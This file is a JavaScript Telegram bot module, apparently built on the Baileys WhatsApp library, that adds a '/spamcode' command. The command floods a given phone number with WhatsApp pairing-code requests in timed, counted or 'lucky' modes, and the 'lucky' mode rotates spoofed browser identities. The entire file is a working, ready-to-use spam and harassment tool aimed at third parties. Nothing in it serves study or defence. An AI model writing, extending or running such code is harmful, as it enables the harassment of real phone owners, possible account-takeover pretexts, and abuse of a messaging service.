const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');

// Shared constants
const warna = [
    '\x1b[31m', '\x1b[32m', '\x1b[33m', '\x1b[34m', 
    '\x1b[35m', '\x1b[36m', '\x1b[37m', '\x1b[90m'
];
const warni = warna[Math.floor(Math.random() * warna.length)];
const resetColor = '\x1b[0m';

const browsers = [
    ["Chrome", "Google Chrome", "115.0.5790.102"],
    ["Firefox", "Mozilla Firefox", "117.0"],
    ["Safari", "Safari", "16.6"],
    ["Edge", "Microsoft Edge", "116.0.1938.62"],
    ["Opera", "Opera", "102.0.4880.51"],
    ["Brave", "Brave Browser", "1.57.62"],
    ["Vivaldi", "Vivaldi", "6.2.3105.48"],
    ["UC Browser", "UC Browser", "15.5.4.1018"],
    ["Samsung Internet", "Samsung Internet", "22.0.2.2"],
    ["Puffin Secure", "Puffin Secure Browser", "9.10.1.51577"]
];

const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// Time-based spam function
async function waktuMode(ctx, phoneNumber, duration) {
    const { state } = await useMultiFileAuthState("session");
    const lucky = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        await ctx.reply(`🚀 Starting time-based spam for ${phoneNumber} (${duration} seconds)`);
        
        const startTime = Date.now();
        let i = 0;

        while ((Date.now() - startTime) < duration * 1000) {
            try {
                let code = await lucky.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                i++;
                
                if (i % 10 === 0) {
                    await ctx.reply(`📱 ${phoneNumber} - Code sent #${i}`);
                }
                
                await sleep(500);

                if (i % 1000 === 0) {
                    await ctx.reply('⏸️ Pausing for 10 seconds...');
                    await sleep(10000);
                }
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
        
        await ctx.reply(`✅ Completed! Total codes sent: ${i}`);
    } catch (error) {
        await ctx.reply(`❌ Error: ${error.message}`);
    }
}

// Count-based spam function
async function jumlahMode(ctx, phoneNumber, numCodes) {
    const { state } = await useMultiFileAuthState("session");
    const lucky = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        await ctx.reply(`🚀 Starting count-based spam for ${phoneNumber} (${numCodes} codes)`);

        for (let i = 0; i < numCodes; i++) {
            try {
                let code = await lucky.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                
                if ((i + 1) % 10 === 0) {
                    await ctx.reply(`📱 ${phoneNumber} - Progress: ${i + 1}/${numCodes}`);
                }
                
                await sleep(500);

                if ((i + 1) % 1000 === 0) {
                    await ctx.reply('⏸️ Pausing for 10 seconds...');
                    await sleep(10000);
                }
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
        
        await ctx.reply(`✅ Completed! Total codes sent: ${numCodes}`);
    } catch (error) {
        await ctx.reply(`❌ Error: ${error.message}`);
    }
}

// Lucky mode function
async function luckyMode(ctx, phoneNumber, duration) {
    const sasa = browsers[Math.floor(Math.random() * browsers.length)];
    
    const { state } = await useMultiFileAuthState("session");
    const lucky = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: sasa,
    });

    try {
        await ctx.reply(`🍀 Starting lucky mode for ${phoneNumber} (${duration} seconds)\nUsing browser: ${sasa[0]}`);
        
        const startTime = Date.now();
        let i = 0;

        while ((Date.now() - startTime) < duration * 1000) {
            try {
                let code = await lucky.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                i++;
                await sleep(500);
            } catch (error) {
                console.error('Error:', error.message);
                await sleep(10000);
            }
        }
        
        await ctx.reply(`✅ Lucky mode completed! Total attempts: ${i}`);
    } catch (error) {
        await ctx.reply(`❌ Error: ${error.message}`);
    }
}

module.exports = (bot) => {
    bot.command("spamcode", async (ctx) => {
        const args = ctx.message.text.split(' ').slice(1);
        
        if (args.length < 3) {
            return ctx.reply(`📖 SPAM CODE MENU

Usage examples:
• \/spamcode waktu [nomor] [detik]\
  Example: \/spamcode waktu 628123456789 30\
⠀
• \/spamcode jumlah [nomor] [jumlah]\  
Example: \/spamcode jumlah 628123456789 50\
⠀
• \/spamcode lucky [nomor] [detik]\
  Example: \/spamcode lucky 628123456789 25\
⠀
Modes:
🕐 waktu - Time based spam
🔢 jumlah - Count based spam  
🍀 lucky - Lucky mode (random browser)`);
        }

        const mode = args[0].toLowerCase();
        const phoneNumber = args[1];
        const value = parseInt(args[2]);

        if (isNaN(value) || value <= 0) {
            return ctx.reply('❌ Please enter a valid number for duration/count');
        }

        if (!phoneNumber || phoneNumber.length < 10) {
            return ctx.reply('❌ Please enter a valid phone number');
        }

        try {
            switch (mode) {
                case 'waktu':
                    await waktuMode(ctx, phoneNumber, value);
                    break;
                case 'jumlah':
                    await jumlahMode(ctx, phoneNumber, value);
                    break;
                case 'lucky':
                    await luckyMode(ctx, phoneNumber, value);
                    break;
                default:
                    await ctx.reply('❌ Invalid mode! Use: waktu, jumlah, or lucky');
            }
        } catch (error) {
            await ctx.reply(`❌ Command failed: ${error.message}`);
        }
    });
};